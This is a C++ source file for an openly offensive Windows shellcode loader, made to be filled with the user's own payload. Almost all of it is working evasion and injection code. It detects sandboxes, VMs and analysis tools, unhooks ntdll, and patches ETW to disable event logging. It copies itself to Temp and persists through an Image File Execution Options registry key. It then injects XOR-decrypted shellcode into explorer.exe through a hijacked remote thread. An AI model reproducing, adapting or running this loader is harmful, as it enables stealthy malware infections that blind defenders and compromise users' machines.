#include <Windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <shlobj.h>
#include <cmath>
#include <shlobj.h>
#include <shlwapi.h>
#include <intrin.h>
#include "obfusheader.h"
#pragma comment(lib, "advapi32")
#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "Shlwapi.lib")
#ifndef M_PI
#define M_PI 3.14159265358979323846 //dont forget to eat pi ;-)
#endif
//Typedefs for dyn calls
typedef LPVOID(WINAPI* VirtualAllocEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI* WriteProcessMemory_t)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL(WINAPI* VirtualProtectEx_t)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateRemoteThread_t)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI* VirtualFreeEx_t)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtect_t VirtualProtect_p;

//XOR Magic <3
void xorDecrypt(std::vector<unsigned char>& data, unsigned char key, size_t start, size_t end) {
    for (size_t i = (start); i < (end); ++i) {
        data[i] ^= (key);
    }
}

//shellcode parse
std::vector<unsigned char> parseShell(const std::string& shellcode) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < shellcode.length(); ++i) {
        if (shellcode[i] == '\\' && shellcode[i + 1] == 'x') {
            bytes.push_back(static_cast<unsigned char>(std::stoi(shellcode.substr(i + 2, 2), nullptr, OBF(16))));
            i += 3;
        }
    }
    return bytes;
}
//Add registry entry persistence (dynamic) (gflag)
void Persist(const char* newPath) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, OBF("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wuauclt.exe"), 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, OBF("Debugger"), 0, REG_SZ, (const BYTE*)newPath, (DWORD)(strlen(newPath) + 1));
        RegCloseKey(hKey);
    }
}

//Clone  to the temp folder
void TempClone(char* dstPath) {
    char src[MAX_PATH];
    GetModuleFileNameA(NULL, src, OBF(MAX_PATH));
    SHGetFolderPathA(NULL, OBF(CSIDL_LOCAL_APPDATA), NULL, 0, dstPath); // Use CSIDL_LOCAL_APPDATA to avoid issues with CSIDL_TEMP
    strcat_s(dstPath, OBF(MAX_PATH), OBF("\\Temp\\"));
    strcat_s(dstPath, OBF(MAX_PATH), strrchr(src, '\\') + 1);
    CopyFileA(src, dstPath, FALSE);
}
//Get PID of a proc
DWORD getPID(const wchar_t* processName) {
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    HANDLE snapshot = CreateToolhelp32Snapshot(OBF(TH32CS_SNAPPROCESS), 0);
    if (snapshot == INVALID_HANDLE_VALUE) return OBF(0);
    for (Process32FirstW(snapshot, &pe32); Process32NextW(snapshot, &pe32);)
        if (!_wcsicmp(pe32.szExeFile, processName)) { CloseHandle(snapshot); return pe32.th32ProcessID; }
    CloseHandle(snapshot);
    return OBF(0);
}

//Unhook ntdll.dll
BOOL UnhookNTDLL(HMODULE hNtdll, LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + (IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!strcmp((char*)pish->Name, OBF(".text"))) {
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            memcpy((LPVOID)((DWORD_PTR)hNtdll + pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + pish->VirtualAddress), pish->Misc.VirtualSize);
            VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            return OBF(0);
        }
    }
    return OBF(-1);
}
//Patch ETW logging
BOOL FuckTheETW() {
    DWORD oldprotect = 0;
    const char* functions[] = { OBF("EtwEventWrite"), OBF("EtwEventWriteFull"), OBF("EtwEventWriteTransfer"), OBF("EtwRegister"), OBF("EtwRegisterTraceGuidsW"), OBF("EtwRegisterTraceGuidsA"), OBF("EtwSendMessage"), OBF("EtwEventWriteNoRegistration") };
    for (int i = 0; i < OBF(sizeof(functions) / sizeof(functions[0])); i++) {
        void* pFunc = GetProcAddress(GetModuleHandleA(OBF("ntdll.dll")), functions[i]);
        if (!pFunc) continue;
        if (!VirtualProtect_p(pFunc, OBF(4096), PAGE_EXECUTE_READWRITE, &oldprotect)) return FALSE;
#ifdef _WIN64
        memcpy(pFunc, OBF("\x48\x33\xc0\xc3"), OBF(4)); // xor rax, rax; ret
#else
        memcpy(pFunc, OBF("\x33\xc0\xc2\x14\x00"), OBF(5)); // xor eax, eax; ret 14
#endif
        VirtualProtect_p(pFunc, OBF(4096), oldprotect, &oldprotect);
        FlushInstructionCache(GetCurrentProcess(), pFunc, OBF(4096));
    }
    return TRUE;
}

//Check if user has recent files
bool RecentFilesCheck(int threshold) {
    TCHAR recentPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, OBF(CSIDL_RECENT), NULL, 0, recentPath))) {
        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile((std::wstring(recentPath) + OBF(L"\\*")).c_str(), &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            return false;
        }

        int count = 0;
        do {
            if (!(findFileData.dwFileAttributes & OBF(FILE_ATTRIBUTE_DIRECTORY))) {
                count++;
            }
        } while (FindNextFile(hFind, &findFileData) != 0);

        FindClose(hFind);
        return count < (threshold);
    }
    return false;
}
//Check for no-no programs
BOOL ProcCheck1(const wchar_t* processName) {
    BOOL exists = FALSE;
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE snapshot = CreateToolhelp32Snapshot(OBF(TH32CS_SNAPPROCESS), 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) { 
                exists = TRUE;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return exists;
}

// Function to check if any no-no tools are running
BOOL ProcCheck2() {
    const wchar_t* tools[] = {
        OBF(L"procexp.exe"), OBF(L"ProcessHacker.exe"), OBF(L"wireshark.exe"), OBF(L"tcpview.exe"),
        OBF(L"ollydbg.exe"), OBF(L"x32dbg.exe"), OBF(L"x64dbg.exe"), OBF(L"idaq.exe"), OBF(L"idaq64.exe"), OBF(L"idag.exe"), OBF(L"idag64.exe"),
        OBF(L"ghidra.exe"), OBF(L"windbg.exe"), OBF(L"cheatengine.exe"), OBF(L"autoruns.exe"), OBF(L"handle.exe"), OBF(L"immunitydebugger.exe"),
        OBF(L"radare2.exe"), OBF(L"hiew.exe"), OBF(L"procmon.exe")
    };
    for (int i = 0; i < OBF(sizeof(tools) / sizeof(tools[0])); i++) {
        if (ProcCheck1(tools[i])) {
            return TRUE;
        }
    }
    return FALSE;
}
//Calculate mousemath to determine if humanized
double MouseMath(const POINT& p1, const POINT& p2, const POINT& p3) {
    double dx1 = p1.x - p2.x;
    double dy1 = p1.y - p2.y;
    double dx2 = p3.x - p2.x;
    double dy2 = p3.y - p2.y;
    double dotProduct = dx1 * dx2 + dy1 * dy2;
    double magnitude1 = sqrt(dx1 * dx1 + dy1 * dy1);
    double magnitude2 = sqrt(dx2 * dx2 + dy2 * dy2);
    return acos(dotProduct / (magnitude1 * magnitude2)) * (180.0 / M_PI);
}
bool MouseCheck() {
    std::vector<POINT> points;
    for (int i = 0; i < 10; i++) {
        POINT p;
        GetCursorPos(&p);
        points.push_back(p);
        Sleep(50);
    }

    for (size_t i = 1; i < points.size() - 1; ++i) {
        double angle = MouseMath(points[i - 1], points[i], points[i + 1]);
        if (angle > 45.0) {
            return false; 
        }
    }
    return true;
}
//Check recent activity
bool ActivityCheck() {
    LASTINPUTINFO lastInputInfo;
    lastInputInfo.cbSize = sizeof(LASTINPUTINFO);

    if (GetLastInputInfo(&lastInputInfo)) {
        DWORD currentTime = GetTickCount();
        DWORD inactiveTime = currentTime - lastInputInfo.dwTime;
        return inactiveTime < OBF(60000); //1 min
    }
    return false;
}

// Count open windows, should be >10 always for non VM
BOOL CALLBACK CountOpen(HWND hwnd, LPARAM lParam) {
    int* count = (int*)lParam;
    (*count)++;
    return TRUE;
}

bool OpenWinCheck(int threshold) {
    int count = 0;
    EnumWindows(CountOpen, (LPARAM)&count);
    return count > (threshold);
}
// Check for VirtCPU names
bool VirtCPU() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, OBF(0x40000000));
    char hyperVendor[13];
    memcpy(hyperVendor, &cpuInfo[1], OBF(4));
    memcpy(hyperVendor + 4, &cpuInfo[2], OBF(4));
    memcpy(hyperVendor + 8, &cpuInfo[3], OBF(4));
    hyperVendor[12] = '\0';

    std::string hyperVendorStr = hyperVendor;
    if (hyperVendorStr == OBF("VMwareVMware") ||
        hyperVendorStr == OBF("KVMKVMKVM") ||
        hyperVendorStr == OBF("VBoxVBoxVBox")) {
        return true;
    }

    return false;
}

//Check RAM cap
bool Less4Ram() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);

    if (GlobalMemoryStatusEx(&memStatus)) {
        DWORDLONG totalPhysicalMemory = memStatus.ullTotalPhys;
        const DWORDLONG fourGB = OBF(4ULL * 1024 * 1024 * 1024); // 4GB in bytes

        if (totalPhysicalMemory < fourGB) {
            return true;
        }
    }

    return false;
}

//Check C drive Cap
bool Less128() {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;

    if (GetDiskFreeSpaceExA(OBF("C:\\"), &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        const DWORDLONG oneHundredTwentyEightGB = OBF(128ULL * 1024 * 1024 * 1024); // 128GB in bytes

        if (totalBytes.QuadPart < oneHundredTwentyEightGB) {
            return true;
        }
    }

    return false;
}


int main() {

    if (ProcCheck2() || RecentFilesCheck(3) || !MouseCheck() || !ActivityCheck() || !OpenWinCheck(10) || Less128() || Less4Ram() || VirtCPU()) {
        std::cout << OBF("Stop trying to analyze me plz!") << std::endl;
        return -1;
    }
   
    HMODULE hNtdll = GetModuleHandleA(OBF("ntdll.dll"));
    HANDLE hFile = CreateFileA(OBF("C:\\Windows\\System32\\ntdll.dll"), OBF(GENERIC_READ), OBF(FILE_SHARE_READ), NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, OBF(PAGE_READONLY) | OBF(SEC_IMAGE), 0, 0, NULL);
    if (!hFileMapping) {
        CloseHandle(hFile);
        return -1;
    }

    LPVOID pMapping = MapViewOfFile(hFileMapping, OBF(FILE_MAP_READ), 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualProtect"));
    if (!VirtualProtect_p) {
        UnmapViewOfFile(pMapping);
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    if (UnhookNTDLL(hNtdll, pMapping) != 0) {
        UnmapViewOfFile(pMapping);
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    UnmapViewOfFile(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    if (!FuckTheETW()) return -1;

    char newLocation[MAX_PATH];
    TempClone(newLocation);
    Persist(newLocation);

    DWORD pid = getPID(OBF(L"explorer.exe"));
    if (!pid) return -1;

    HANDLE hProcess = OpenProcess(OBF(PROCESS_VM_OPERATION) | OBF(PROCESS_VM_WRITE) | OBF(PROCESS_CREATE_THREAD) | OBF(PROCESS_QUERY_INFORMATION), (FALSE), (pid));
    if (!hProcess) return -1;

    HMODULE hKernel32 = GetModuleHandle(OBF(L"kernel32.dll"));
    if (!hKernel32) {
        CloseHandle(hProcess);
        return -1;
    }

    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(hKernel32, OBF("VirtualAllocEx"));
    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(hKernel32, OBF("WriteProcessMemory"));
    VirtualProtectEx_t pVirtualProtectEx = (VirtualProtectEx_t)GetProcAddress(hKernel32, OBF("VirtualProtectEx"));
    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(hKernel32, OBF("CreateRemoteThread"));
    VirtualFreeEx_t pVirtualFreeEx = (VirtualFreeEx_t)GetProcAddress(hKernel32, OBF("VirtualFreeEx"));

    if (!pVirtualAllocEx || !pWriteProcessMemory || !pVirtualProtectEx || !pCreateRemoteThread || !pVirtualFreeEx) {
        CloseHandle(hProcess);
        return -1;
    }

    std::string encryptedShellcodeStr = OBF(""); //Place your XOR encrypted shellcode here (**need** to format like: \\x56\\xe2\\x29\\x4e)
    unsigned char key = 0xAA;
    std::vector<unsigned char> shellcode = parseShell(encryptedShellcodeStr);

    LPVOID alloc = pVirtualAllocEx(hProcess, NULL, shellcode.size(), OBF(MEM_COMMIT) | OBF(MEM_RESERVE), OBF(PAGE_READWRITE));
    if (!alloc) {
        CloseHandle(hProcess);
        return -1;
    }

    size_t chunkSize = 10; //Adjust the chunk size
    size_t totalSize = shellcode.size();
    SIZE_T bytesWritten;

    for (size_t i = 0; i < totalSize; i += chunkSize) {
        size_t end = (i + chunkSize > totalSize) ? totalSize : i + chunkSize;
        xorDecrypt(shellcode, key, i, end);
        if (!pWriteProcessMemory(hProcess, (LPVOID)((BYTE*)alloc + i), shellcode.data() + i, end - i, &bytesWritten)) {
            pVirtualFreeEx(hProcess, alloc, 0, OBF(MEM_RELEASE));
            CloseHandle(hProcess);
            return -1;
        }
    }

    DWORD oldProtect;
    if (!pVirtualProtectEx(hProcess, alloc, shellcode.size(), OBF(PAGE_EXECUTE_READ), &oldProtect)) {
        pVirtualFreeEx(hProcess, alloc, 0, OBF(MEM_RELEASE));
        CloseHandle(hProcess);
        return -1;
    }

    void* loadLibrary = GetProcAddress(LoadLibraryA(OBF("kernel32.dll")), OBF("LoadLibraryA"));
    if (!loadLibrary) {
        pVirtualFreeEx(hProcess, alloc, 0, OBF(MEM_RELEASE));
        CloseHandle(hProcess);
        return -1;
    }

    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, NULL, OBF(CREATE_SUSPENDED), NULL);
    if (!hThread) {
        pVirtualFreeEx(hProcess, alloc, 0, OBF(MEM_RELEASE));
        CloseHandle(hProcess);
        return -1;
    }

    CONTEXT ctx;
    ctx.ContextFlags = OBF(CONTEXT_CONTROL);
    if (!GetThreadContext(hThread, &ctx)) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

#ifdef _WIN64
    ctx.Rip = (DWORD64)alloc;
#else
    ctx.Eip = (DWORD)alloc;
#endif

    if (!SetThreadContext(hThread, &ctx)) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }

    if (ResumeThread(hThread) == (DWORD)-1) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return -1;
    }
    Sleep(5555);
    //Revert mems to non executable (thx gargoyle technique <3)
    pVirtualProtectEx(hProcess, alloc, shellcode.size(), PAGE_READWRITE, &oldProtect);

    
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

